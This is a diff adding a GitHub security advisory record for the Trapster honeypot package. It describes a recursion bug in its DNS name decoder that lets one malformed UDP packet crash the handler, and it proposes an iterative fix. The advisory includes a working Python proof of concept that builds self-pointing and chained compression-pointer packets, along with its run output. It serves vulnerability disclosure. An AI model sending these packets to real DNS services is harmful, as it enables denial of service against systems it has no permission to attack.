@@ -1,0 +1,75 @@
+{
+  "id": "GHSA-mxwc-wh95-pw4g",
+  "modified": "2026-07-08T20:30:17.645627751Z",
+  "published": "2026-07-08T20:24:46Z",
+  "summary": "Trapster Community: Unauthenticated malformed DNS compression pointers crash per-packet honeypot handler",
+  "details": "## Summary\n\n`trapster.libs.dns.decode_labels()` decodes DNS names from attacker-supplied UDP packets and recurses **once per RFC 1035 compression pointer** with **no cycle detection and no depth bound**. A single unauthenticated UDP datagram sent to the DNS honeypot drives the function past CPython's recursion limit, raising `RecursionError`. That exception is not handled anywhere on the `datagram_received` path, so it escapes into the asyncio event loop's default exception handler, the per-packet proxy task is never created, and a low-rate flood produces sustained CPU burn and log flooding (denial of service of the DNS honeypot module).\n\n## Severity\n\nMedium (CVSS:3.1 `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L`). Network-reachable, unauthenticated, single-packet, availability-only against the DNS honeypot listener.\n\n## Affected component\n\n- File: `trapster/libs/dns.py`, function `decode_labels()` (called by `decode_question_section` → `decode_dns_message`).\n- Reached from: `trapster/modules/dns.py`, `DnsUdpProtocol.datagram_received()` → `dns.decode_dns_message(data)`, where `data` is the raw attacker UDP payload received by `DnsHoneypot` on its configured bind address/port.\n- Version tested: latest `main` at commit `23156739de23816657cbc4582ad32094ed1cab43`.\n\n## Details\n\n`decode_labels` implements RFC 1035 §4.1.4 name compression:\n\n```python\ndef decode_labels(message, offset):\n    labels = []\n    while True:\n        length, = struct.unpack_from(\"!B\", message, offset)\n        if (length \u0026 0xC0) == 0xC0:\n            pointer, = struct.unpack_from(\"!H\", message, offset)\n            offset += 2\n            return labels + decode_labels(message, pointer \u0026 0x3FFF), offset   # \u003c-- recurses per pointer\n        ...\n```\n\nEach compression pointer triggers a fresh recursive call to `decode_labels`. There is:\n\n- **No cycle detection** — a pointer that targets its own offset recurses forever.\n- **No depth bound** — a chain of distinct forward pointers recurses once per pointer.\n\nEither shape exhausts the Python stack and raises `RecursionError`. `decode_dns_message` does not catch it, and in `DnsUdpProtocol.datagram_received` the call `dns.decode_dns_message(data)` is unguarded, so the exception propagates out of `datagram_received` into the event loop. Each hostile packet therefore aborts its own packet-handling/proxy task, and the loop's default exception handler logs a full traceback for every packet.\n\nThis is the same class of bug fixed upstream in `python-zeroconf` (compression-pointer recursion), except this implementation additionally lacks the loop/cycle guard that zeroconf already had.\n\n## Proof of Concept\n\nReal-deploy E2E. The actual `trapster.modules.dns.DnsHoneypot` server is started on a real UDP socket; hostile packets are sent from a separate real client socket over loopback. The event-loop exception handler records what escapes `datagram_received`.\n\n`e2e_poc.py`:\n\n```python\nimport asyncio, struct, socket, sys\nfrom trapster.modules.dns import DnsHoneypot\nfrom trapster.logger.base import BaseLogger\n\nHOST, PORT = \"127.0.0.1\", 15353\ncaptured_loop_exceptions = []\n\ndef build_benign_query(qname=b\"example.com\"):\n    header = struct.pack(\"!6H\", 0x1234, 0x0100, 1, 0, 0, 0)\n    labels = b\"\".join(struct.pack(\"!B\", len(p)) + p for p in qname.split(b\".\")) + b\"\\x00\"\n    return header + labels + struct.pack(\"!2H\", 1, 1)\n\ndef build_self_pointer():\n    header = struct.pack(\"!6H\", 0x1234, 0x0100, 1, 0, 0, 0)\n    name = struct.pack(\"!H\", 0xC000 | 12)   # pointer to offset 12 == this name\n    return header + name + struct.pack(\"!2H\", 1, 1)\n\ndef build_pointer_chain(depth=2000):\n    header = struct.pack(\"!6H\", 0x1234, 0x0100, 1, 0, 0, 0)\n    name = struct.pack(\"!H\", 0xC000 | 18)\n    qtail = struct.pack(\"!2H\", 1, 1)\n    chain = bytearray()\n    for i in range(depth):\n        chain += struct.pack(\"!H\", 0xC000 | (18 + 2 * (i + 1)))\n    chain += b\"\\x00\"\n    return header + name + qtail + bytes(chain)\n\ndef send_udp(payload, timeout=1.0):\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)\n    s.sendto(payload, (HOST, PORT))\n    try: return s.recvfrom(4096)[0]\n    except socket.timeout: return None\n    finally: s.close()\n\nasync def main():\n    loop = asyncio.get_running_loop()\n    def handler(loopobj, context):\n        exc = context.get(\"exception\")\n        captured_loop_exceptions.append((repr(exc), context.get(\"message\")))\n        print(f\"[loop-exception-handler] {type(exc).__name__ if exc else None}: {context.get('message')}\")\n    loop.set_exception_handler(handler)\n\n    hp = DnsHoneypot(config={\"port\": PORT, \"target_dns\": \"127.0.0.1\"},\n                     logger=BaseLogger(node_id=\"e2e\"), bindaddr=HOST)\n    await hp.start(); await asyncio.sleep(0.4)\n    print(f\"[deploy] DnsHoneypot listening on udp://{HOST}:{PORT}\\n\")\n\n    print(\"=== NEGATIVE CONTROL: benign query example.com A ===\")\n    captured_loop_exceptions.clear(); send_udp(build_benign_query()); await asyncio.sleep(0.3)\n    print(f\"  loop exceptions after benign packet: {len(captured_loop_exceptions)}\")\n    assert len(captured_loop_exceptions) == 0\n    print(\"  -\u003e benign packet parsed cleanly, no exception\\n\")\n\n    print(\"=== VECTOR A: single self-referential compression pointer (cycle) ===\")\n    captured_loop_exceptions.clear(); pkt = build_self_pointer()\n    print(f\"  packet ({len(pkt)} bytes) name field = pointer 0xC00C -\u003e offset 12 (itself)\")\n    send_udp(pkt); await asyncio.sleep(0.5)\n    print(f\"  loop exceptions captured: {len(captured_loop_exceptions)}\")\n    for e in captured_loop_exceptions: print(f\"    {e}\")\n    assert any(\"RecursionError\" in e[0] for e in captured_loop_exceptions)\n    print(\"  -\u003e RecursionError escaped datagram_received (DoS, no cycle guard)\\n\")\n\n    print(\"=== VECTOR B: 2000 chained forward compression pointers (zeroconf shape) ===\")\n    captured_loop_exceptions.clear(); pkt = build_pointer_chain(2000)\n    print(f\"  packet ({len(pkt)} bytes) = 2000-deep forward pointer chain\")\n    send_udp(pkt); await asyncio.sleep(0.5)\n    print(f\"  loop exceptions captured: {len(captured_loop_exceptions)}\")\n    for e in captured_loop_exceptions: print(f\"    {e}\")\n    assert any(\"RecursionError\" in e[0] for e in captured_loop_exceptions)\n    print(\"  -\u003e RecursionError escaped datagram_received (DoS, no depth bound)\\n\")\n\n    await hp.stop(); print(\"ALL ASSERTIONS PASSED\")\n\nif __name__ == \"__main__\":\n    sys.setrecursionlimit(1000)\n    asyncio.run(main())\n```\n\nVerbatim run against the deployed honeypot at commit `23156739de23816657cbc4582ad32094ed1cab43`:\n\n```\n[deploy] DnsHoneypot listening on udp://127.0.0.1:15353\n\n=== NEGATIVE CONTROL: benign query example.com A ===\n  loop exceptions after benign packet: 0\n  -\u003e benign packet parsed cleanly, no exception\n\n=== VECTOR A: single self-referential compression pointer (cycle) ===\n  packet (18 bytes) name field = pointer 0xC00C -\u003e offset 12 (itself)\n[loop-exception-handler] RecursionError: Exception in callback _SelectorDatagramTransport._read_ready()\n  loop exceptions captured: 1\n    (\"RecursionError('maximum recursion depth exceeded in comparison')\", 'Exception in callback _SelectorDatagramTransport._read_ready()')\n  -\u003e RecursionError escaped datagram_received (DoS, no cycle guard)\n\n=== VECTOR B: 2000 chained forward compression pointers (zeroconf shape) ===\n  packet (4019 bytes) = 2000-deep forward pointer chain\n[loop-exception-handler] RecursionError: Exception in callback _SelectorDatagramTransport._read_ready()\n  loop exceptions captured: 1\n    (\"RecursionError('maximum recursion depth exceeded in comparison')\", 'Exception in callback _SelectorDatagramTransport._read_ready()')\n  -\u003e RecursionError escaped datagram_received (DoS, no depth bound)\n\nALL ASSERTIONS PASSED\n```\n\nThe negative control (a well-formed `example.com` A query) parses with zero exceptions, confirming the crash is specific to the malformed compression input.\n\n## Impact\n\nAny host able to send UDP to the DNS honeypot's bind address/port (unauthenticated, no UI) can crash the per-packet handler with a single ~18-byte datagram. A low-rate flood (a few packets per second) keeps the event loop logging full tracebacks and burning CPU, degrading the DNS honeypot and its logging pipeline. Availability impact only; no memory disclosure or code execution.\n\n## Suggested fix\n\nMake `decode_labels` iterative-bounded: require every compression pointer to point strictly backward to a not-yet-visited offset, which bounds both cycles and long forward chains in O(message length) with no recursion. (This mirrors `dnspython`'s `biggest_pointer` design and the zeroconf depth-bound fix.) Replace the bare `raise \"unknown label encoding\"` with a real exception, and consider wrapping `dns.decode_dns_message(data)` in `DnsUdpProtocol.datagram_received` in a try/except so a malformed packet is logged once rather than escaping to the loop handler.\n\nVerified fix (benign + legitimate backward-compression names still decode; both hostile vectors are bounded to `ValueError` with no recursion):\n\n```python\ndef decode_labels(message, offset):\n    labels = []\n    return_offset = None\n    max_allowed_pointer = len(message)\n    while True:\n        length, = struct.unpack_from(\"!B\", message, offset)\n        if (length \u0026 0xC0) == 0xC0:\n            pointer, = struct.unpack_from(\"!H\", message, offset)\n            if return_offset is None:\n                return_offset = offset + 2\n            target = pointer \u0026 0x3FFF\n            if target \u003e= max_allowed_pointer:\n                raise ValueError(\"invalid DNS compression pointer\")\n            max_allowed_pointer = target\n            offset = target\n            continue\n        if (length \u0026 0xC0) != 0x00:\n            raise ValueError(\"unknown label encoding\")\n        offset += 1\n        if length == 0:\n            return labels, return_offset if return_offset is not None else offset\n        labels.append(*struct.unpack_from(\"!%ds\" % length, message, offset))\n        try:\n            labels[-1] = labels[-1].decode()\n        except UnicodeDecodeError:\n            labels[-1] = str(labels[-1])\n        offset += length\n```\n\nA fix PR will be supplied from a temporary private fork during the embargo.\n\n## Credit\n\nDiscovered and reported by tonghuaroot.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "trapster",
+        "purl": "pkg:pypi/trapster"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "1.2.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0.10",
+        "1.0.12",
+        "1.0.13",
+        "1.0.14",
+        "1.0.15",
+        "1.0.16",
+        "1.0.17",
+        "1.0.19",
+        "1.0.20",
+        "1.0.21",
+        "1.0.22",
+        "1.0.23",
+        "1.0.24",
+        "1.0.25",
+        "1.0.26",
+        "1.0.4",
+        "1.0.5",
+        "1.0.6",
+        "1.0.7",
+        "1.0.8",
+        "1.0.9",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.1.3",
+        "1.1.4",
+        "1.1.5",
+        "1.1.6",
+        "1.1.7",
+        "1.1.8",
+        "1.2.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-mxwc-wh95-pw4g/GHSA-mxwc-wh95-pw4g.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/0xBallpoint/trapster-community/security/advisories/GHSA-mxwc-wh95-pw4g"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/0xBallpoint/trapster-community"
+    }
+  ]
+}
